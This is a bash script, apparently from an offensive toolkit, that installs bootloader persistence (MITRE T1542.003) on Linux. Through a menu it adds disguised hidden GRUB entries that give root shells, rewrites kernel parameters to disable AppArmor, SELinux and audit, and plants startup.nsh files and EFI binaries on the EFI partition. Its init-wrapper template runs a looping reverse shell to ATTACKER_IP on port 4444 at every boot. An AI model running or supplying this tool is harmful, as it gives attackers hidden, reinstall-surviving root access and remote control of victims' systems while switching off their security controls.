#!/bin/bash
#
# bootkit.sh — T1542.003 Bootloader Persistence (GRUB2 / EFI)
#
# Inject persistence into GRUB2 bootloader, EFI System Partition,
# and kernel boot parameters. Survives OS reinstallation if ESP untouched.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

BACKUP_DIR="/var/lib/.d3m0n_bootkit_bak"
GRUB_CUSTOM="/etc/grub.d/40_custom"
GRUB_CFG="/boot/grub/grub.cfg"
GRUB_DEFAULT="/etc/default/grub"

banner_bootkit() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1542.003 — Bootloader Persistence (GRUB2 / EFI)    ║"
    echo "  ║   GRUB hooks, kernel params, EFI backdoors            ║"
    echo "  ╠═══════════════════════════════════════════════════════╣"
    echo "  ║   WARNING: Incorrect changes can BRICK the system!    ║"
    echo "  ║   Backups are created automatically.                  ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

backup_grub() {
    mkdir -p "$BACKUP_DIR" 2>/dev/null

    # Backup grub config
    [[ -f "$GRUB_CFG" ]] && cp "$GRUB_CFG" "${BACKUP_DIR}/grub.cfg.bak"
    [[ -f "$GRUB_DEFAULT" ]] && cp "$GRUB_DEFAULT" "${BACKUP_DIR}/grub_default.bak"
    [[ -f "$GRUB_CUSTOM" ]] && cp "$GRUB_CUSTOM" "${BACKUP_DIR}/40_custom.bak"

    # Backup grub.d scripts
    if [[ -d /etc/grub.d ]]; then
        cp -r /etc/grub.d "${BACKUP_DIR}/grub.d.bak" 2>/dev/null
    fi

    echo -e "${GREEN}  [+] GRUB config backed up to ${BACKUP_DIR}${NC}"
}

# ── [1] GRUB2 40_custom injection ──
grub_custom_inject() {
    check_root || return 1

    echo -e "${CYAN}[*] GRUB2 40_custom injection — add hidden boot entry${NC}"
    echo ""
    echo -e "${YELLOW}[?] What should the hidden boot entry do?${NC}"
    echo "  [1] Boot into single-user/recovery mode (root shell)"
    echo "  [2] Boot with init=/bin/bash (bypass init)"
    echo "  [3] Custom kernel parameters"
    read -r ACTION

    backup_grub

    local ENTRY_NAME="System Recovery Mode (Advanced)"
    local KERNEL_PARAMS=""

    case "$ACTION" in
        1)
            KERNEL_PARAMS="single"
            ENTRY_NAME="System Recovery Mode (Advanced)"
            ;;
        2)
            KERNEL_PARAMS="init=/bin/bash"
            ENTRY_NAME="Hardware Diagnostics"
            ;;
        3)
            echo -e "${YELLOW}[?] Custom kernel parameters:${NC}"
            read -r KERNEL_PARAMS
            echo -e "${YELLOW}[?] Menu entry name:${NC}"
            read -r ENTRY_NAME
            ENTRY_NAME="${ENTRY_NAME:-Custom Boot Entry}"
            ;;
        *) echo -e "${RED}[!] Invalid.${NC}"; return 1 ;;
    esac

    # Get current kernel and initrd paths
    local KERNEL INITRD ROOT_DEV
    KERNEL=$(grep -oP 'linux\s+\K/[^ ]+' "$GRUB_CFG" 2>/dev/null | head -1)
    INITRD=$(grep -oP 'initrd\s+\K/[^ ]+' "$GRUB_CFG" 2>/dev/null | head -1)
    ROOT_DEV=$(grep -oP 'root=\K[^ ]+' "$GRUB_CFG" 2>/dev/null | head -1)

    if [[ -z "$KERNEL" ]]; then
        echo -e "${RED}[!] Could not detect kernel path from grub.cfg${NC}"
        echo -e "${YELLOW}[?] Kernel path (e.g. /boot/vmlinuz-5.10.0):${NC}"
        read -r KERNEL
    fi
    if [[ -z "$INITRD" ]]; then
        echo -e "${YELLOW}[?] Initrd path (e.g. /boot/initrd.img-5.10.0):${NC}"
        read -r INITRD
    fi
    if [[ -z "$ROOT_DEV" ]]; then
        ROOT_DEV=$(mount | grep ' / ' | awk '{print $1}')
    fi

    # Append to 40_custom
    cat >> "$GRUB_CUSTOM" << GRUBEOF

# d3m0n_bootkit
menuentry '${ENTRY_NAME}' --class os {
    insmod ext2
    insmod gzio
    set root='hd0,msdos1'
    linux ${KERNEL} root=${ROOT_DEV} ro ${KERNEL_PARAMS} quiet
    initrd ${INITRD}
}
GRUBEOF

    # Update grub
    if command -v update-grub &>/dev/null; then
        update-grub 2>/dev/null
    elif command -v grub2-mkconfig &>/dev/null; then
        grub2-mkconfig -o "$GRUB_CFG" 2>/dev/null
    elif command -v grub-mkconfig &>/dev/null; then
        grub-mkconfig -o "$GRUB_CFG" 2>/dev/null
    fi

    echo -e "${GREEN}[+] Hidden GRUB entry added!${NC}"
    echo -e "${YELLOW}  Name: '${ENTRY_NAME}'${NC}"
    echo -e "${YELLOW}  Params: ${KERNEL_PARAMS}${NC}"
    echo -e "${YELLOW}  Hold SHIFT at boot to access GRUB menu.${NC}"
}

# ── [2] GRUB config backdoor ──
grub_config_backdoor() {
    check_root || return 1

    echo -e "${CYAN}[*] GRUB default config modification${NC}"
    echo ""
    echo -e "${YELLOW}[?] Modification type:${NC}"
    echo "  [1] Add init= parameter (run custom init)"
    echo "  [2] Disable GRUB timeout (always show menu)"
    echo "  [3] Set custom default entry"
    echo "  [4] Add persistent kernel parameters"
    read -r MOD_TYPE

    backup_grub

    case "$MOD_TYPE" in
        1)
            echo -e "${YELLOW}[?] Custom init script path:${NC}"
            read -r INIT_PATH
            if ! grep -q "init=" "$GRUB_DEFAULT" 2>/dev/null; then
                sed -i "s|^GRUB_CMDLINE_LINUX_DEFAULT=\"\(.*\)\"|GRUB_CMDLINE_LINUX_DEFAULT=\"\1 init=${INIT_PATH}\"|" "$GRUB_DEFAULT"
            else
                sed -i "s|init=[^ \"]*|init=${INIT_PATH}|" "$GRUB_DEFAULT"
            fi
            echo -e "${GREEN}  [+] init=${INIT_PATH} added to kernel params${NC}"
            ;;
        2)
            sed -i 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=-1/' "$GRUB_DEFAULT"
            echo -e "${GREEN}  [+] GRUB timeout disabled (menu always shows)${NC}"
            ;;
        3)
            echo -e "${YELLOW}[?] Default entry number (0-based):${NC}"
            read -r DEF_ENTRY
            sed -i "s/^GRUB_DEFAULT=.*/GRUB_DEFAULT=${DEF_ENTRY}/" "$GRUB_DEFAULT"
            echo -e "${GREEN}  [+] Default boot entry set to ${DEF_ENTRY}${NC}"
            ;;
        4)
            echo -e "${YELLOW}[?] Kernel parameters to add:${NC}"
            read -r EXTRA_PARAMS
            sed -i "s|^GRUB_CMDLINE_LINUX_DEFAULT=\"\(.*\)\"|GRUB_CMDLINE_LINUX_DEFAULT=\"\1 ${EXTRA_PARAMS}\"|" "$GRUB_DEFAULT"
            echo -e "${GREEN}  [+] Added kernel params: ${EXTRA_PARAMS}${NC}"
            ;;
        *) echo -e "${RED}[!] Invalid.${NC}"; return 1 ;;
    esac

    # Regenerate grub config
    if command -v update-grub &>/dev/null; then
        update-grub 2>/dev/null
    elif command -v grub2-mkconfig &>/dev/null; then
        grub2-mkconfig -o "$GRUB_CFG" 2>/dev/null
    elif command -v grub-mkconfig &>/dev/null; then
        grub-mkconfig -o "$GRUB_CFG" 2>/dev/null
    fi

    echo -e "${GREEN}[+] GRUB config modified and regenerated.${NC}"
}

# ── [3] EFI System Partition backdoor ──
efi_backdoor() {
    check_root || return 1

    echo -e "${CYAN}[*] EFI System Partition (ESP) backdoor${NC}"
    echo ""

    # Find ESP
    local ESP_MOUNT=""
    for candidate in /boot/efi /boot/EFI /efi; do
        if mountpoint -q "$candidate" 2>/dev/null; then
            ESP_MOUNT="$candidate"
            break
        fi
    done

    if [[ -z "$ESP_MOUNT" ]]; then
        echo -e "${YELLOW}[!] EFI System Partition not found at standard locations.${NC}"
        echo -e "${YELLOW}[?] ESP mount point:${NC}"
        read -r ESP_MOUNT
        if [[ ! -d "$ESP_MOUNT" ]]; then
            echo -e "${RED}[!] Directory not found.${NC}"
            return 1
        fi
    fi

    echo -e "${GREEN}  [+] ESP found at: ${ESP_MOUNT}${NC}"
    echo ""
    echo -e "${YELLOW}[?] EFI backdoor type:${NC}"
    echo "  [1] Drop shell script in EFI/startup.nsh"
    echo "  [2] Copy custom EFI binary"
    echo "  [3] Add to EFI boot order"
    read -r EFI_TYPE

    backup_grub

    case "$EFI_TYPE" in
        1)
            echo -e "${YELLOW}[?] Command to execute on EFI shell:${NC}"
            read -r EFI_CMD
            cat > "${ESP_MOUNT}/startup.nsh" << NSHEOF
@echo -off
${EFI_CMD}
NSHEOF
            echo -e "${GREEN}  [+] startup.nsh created on ESP${NC}"
            ;;
        2)
            echo -e "${YELLOW}[?] Path to EFI binary to copy:${NC}"
            read -r EFI_BIN
            if [[ ! -f "$EFI_BIN" ]]; then
                echo -e "${RED}[!] File not found.${NC}"
                return 1
            fi
            local EFI_DEST="${ESP_MOUNT}/EFI/BOOT/bootx64_bak.efi"
            mkdir -p "$(dirname "$EFI_DEST")" 2>/dev/null
            cp "$EFI_BIN" "$EFI_DEST" 2>/dev/null
            echo -e "${GREEN}  [+] EFI binary placed at ${EFI_DEST}${NC}"
            ;;
        3)
            if command -v efibootmgr &>/dev/null; then
                echo -e "${YELLOW}[?] EFI binary path (relative to ESP, e.g. \\\\EFI\\\\BOOT\\\\bootx64.efi):${NC}"
                read -r EFI_PATH
                echo -e "${YELLOW}[?] Label:${NC}"
                read -r EFI_LABEL
                EFI_LABEL="${EFI_LABEL:-System Recovery}"

                local ESP_DISK ESP_PART
                ESP_DISK=$(mount | grep "$ESP_MOUNT" | awk '{print $1}' | sed 's/[0-9]*$//')
                ESP_PART=$(mount | grep "$ESP_MOUNT" | awk '{print $1}' | grep -oP '[0-9]+$')

                efibootmgr -c -d "$ESP_DISK" -p "$ESP_PART" -L "$EFI_LABEL" -l "$EFI_PATH" 2>/dev/null
                echo -e "${GREEN}  [+] EFI boot entry added: ${EFI_LABEL}${NC}"
            else
                echo -e "${RED}[!] efibootmgr not found. Install: apt install efibootmgr${NC}"
            fi
            ;;
        *) echo -e "${RED}[!] Invalid.${NC}"; return 1 ;;
    esac
}

# ── [4] Kernel parameter injection ──
kernel_param_inject() {
    check_root || return 1

    echo -e "${CYAN}[*] Kernel parameter injection${NC}"
    echo ""
    echo -e "${YELLOW}[?] Injection type:${NC}"
    echo "  [1] Add backdoor init script (runs at boot as PID 1 wrapper)"
    echo "  [2] Disable security modules (apparmor=0 selinux=0)"
    echo "  [3] Enable debug/verbose boot (for recon)"
    echo "  [4] Custom parameters"
    read -r PARAM_TYPE

    backup_grub

    local PARAMS=""
    case "$PARAM_TYPE" in
        1)
            echo -e "${YELLOW}[?] Path to init wrapper script:${NC}"
            read -r INIT_SCRIPT
            if [[ ! -f "$INIT_SCRIPT" ]]; then
                # Create a default wrapper
                cat > "$INIT_SCRIPT" << 'INITEOF'
#!/bin/bash
# d3m0n_bootkit init wrapper
# Run payload then hand off to real init

# --- PAYLOAD START ---
# Add your persistence here
nohup bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null; sleep 300; done' &>/dev/null &
# --- PAYLOAD END ---

# Hand off to real init
exec /sbin/init "$@"
INITEOF
                chmod 755 "$INIT_SCRIPT"
                echo -e "${YELLOW}  [*] Created template at ${INIT_SCRIPT} — edit ATTACKER_IP before use!${NC}"
            fi
            PARAMS="init=${INIT_SCRIPT}"
            ;;
        2) PARAMS="apparmor=0 selinux=0 audit=0" ;;
        3) PARAMS="debug verbose" ;;
        4)
            echo -e "${YELLOW}[?] Parameters:${NC}"
            read -r PARAMS
            ;;
        *) echo -e "${RED}[!] Invalid.${NC}"; return 1 ;;
    esac

    # Inject into GRUB defaults
    local CURRENT
    CURRENT=$(grep "^GRUB_CMDLINE_LINUX_DEFAULT=" "$GRUB_DEFAULT" 2>/dev/null | cut -d'"' -f2)
    sed -i "s|^GRUB_CMDLINE_LINUX_DEFAULT=\".*\"|GRUB_CMDLINE_LINUX_DEFAULT=\"${CURRENT} ${PARAMS}\"|" "$GRUB_DEFAULT"

    # Regenerate
    if command -v update-grub &>/dev/null; then
        update-grub 2>/dev/null
    elif command -v grub2-mkconfig &>/dev/null; then
        grub2-mkconfig -o "$GRUB_CFG" 2>/dev/null
    elif command -v grub-mkconfig &>/dev/null; then
        grub-mkconfig -o "$GRUB_CFG" 2>/dev/null
    fi

    echo -e "${GREEN}[+] Kernel parameters injected: ${PARAMS}${NC}"
}

# ── [5] GRUB module persistence ──
grub_module_persist() {
    check_root || return 1

    echo -e "${CYAN}[*] GRUB module persistence — load custom GRUB modules${NC}"
    echo ""

    # Create a custom grub.d script that runs early
    local GRUB_SCRIPT="/etc/grub.d/01_d3m0n"

    echo -e "${YELLOW}[?] GRUB script action:${NC}"
    echo "  [1] Insert 'insmod' commands into grub.cfg"
    echo "  [2] Add pre-boot commands"
    read -r GRUB_ACT

    backup_grub

    case "$GRUB_ACT" in
        1)
            echo -e "${YELLOW}[?] GRUB modules to load (space-separated, e.g. 'http tftp'):${NC}"
            read -r MODULES
            cat > "$GRUB_SCRIPT" << GEOF
#!/bin/sh
# d3m0n_bootkit grub module loader
exec tail -n +4 \$0
GEOF
            for mod in $MODULES; do
                echo "insmod ${mod}" >> "$GRUB_SCRIPT"
            done
            chmod 755 "$GRUB_SCRIPT"
            echo -e "${GREEN}  [+] GRUB modules will be loaded: ${MODULES}${NC}"
            ;;
        2)
            echo -e "${YELLOW}[?] Pre-boot GRUB commands (one per line, empty line to finish):${NC}"
            cat > "$GRUB_SCRIPT" << GEOF
#!/bin/sh
# d3m0n_bootkit pre-boot
exec tail -n +4 \$0
GEOF
            while IFS= read -r line; do
                [[ -z "$line" ]] && break
                echo "$line" >> "$GRUB_SCRIPT"
            done
            chmod 755 "$GRUB_SCRIPT"
            echo -e "${GREEN}  [+] Pre-boot commands installed${NC}"
            ;;
        *) echo -e "${RED}[!] Invalid.${NC}"; return 1 ;;
    esac

    # Regenerate
    if command -v update-grub &>/dev/null; then
        update-grub 2>/dev/null
    elif command -v grub2-mkconfig &>/dev/null; then
        grub2-mkconfig -o "$GRUB_CFG" 2>/dev/null
    elif command -v grub-mkconfig &>/dev/null; then
        grub-mkconfig -o "$GRUB_CFG" 2>/dev/null
    fi

    echo -e "${GREEN}[+] GRUB module persistence installed.${NC}"
}

# ── [6] Restore ──
restore_bootkit() {
    check_root || return 1

    echo -e "${CYAN}[*] Restoring bootloader configuration...${NC}"

    if [[ ! -d "$BACKUP_DIR" ]]; then
        echo -e "${RED}[!] No backups found at ${BACKUP_DIR}${NC}"
        return 1
    fi

    # Restore files
    [[ -f "${BACKUP_DIR}/grub.cfg.bak" ]] && cp "${BACKUP_DIR}/grub.cfg.bak" "$GRUB_CFG" 2>/dev/null
    [[ -f "${BACKUP_DIR}/grub_default.bak" ]] && cp "${BACKUP_DIR}/grub_default.bak" "$GRUB_DEFAULT" 2>/dev/null
    [[ -f "${BACKUP_DIR}/40_custom.bak" ]] && cp "${BACKUP_DIR}/40_custom.bak" "$GRUB_CUSTOM" 2>/dev/null

    # Restore grub.d
    if [[ -d "${BACKUP_DIR}/grub.d.bak" ]]; then
        cp -r "${BACKUP_DIR}/grub.d.bak/"* /etc/grub.d/ 2>/dev/null
    fi

    # Remove injected scripts
    rm -f /etc/grub.d/01_d3m0n 2>/dev/null

    # Regenerate
    if command -v update-grub &>/dev/null; then
        update-grub 2>/dev/null
    elif command -v grub2-mkconfig &>/dev/null; then
        grub2-mkconfig -o "$GRUB_CFG" 2>/dev/null
    elif command -v grub-mkconfig &>/dev/null; then
        grub-mkconfig -o "$GRUB_CFG" 2>/dev/null
    fi

    rm -rf "$BACKUP_DIR"
    echo -e "${GREEN}[+] Bootloader configuration restored.${NC}"
}

# ── MAIN MENU ──
main_menu() {
    banner_bootkit
    echo -e "  ${CYAN}[1]${NC} GRUB2 40_custom injection (hidden boot entry)"
    echo -e "  ${CYAN}[2]${NC} GRUB config backdoor (modify defaults)"
    echo -e "  ${CYAN}[3]${NC} EFI System Partition backdoor"
    echo -e "  ${CYAN}[4]${NC} Kernel parameter injection"
    echo -e "  ${CYAN}[5]${NC} GRUB module persistence"
    echo -e "  ${CYAN}[6]${NC} Restore bootloader from backup"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) grub_custom_inject ;;
        2) grub_config_backdoor ;;
        3) efi_backdoor ;;
        4) kernel_param_inject ;;
        5) grub_module_persist ;;
        6) restore_bootkit ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
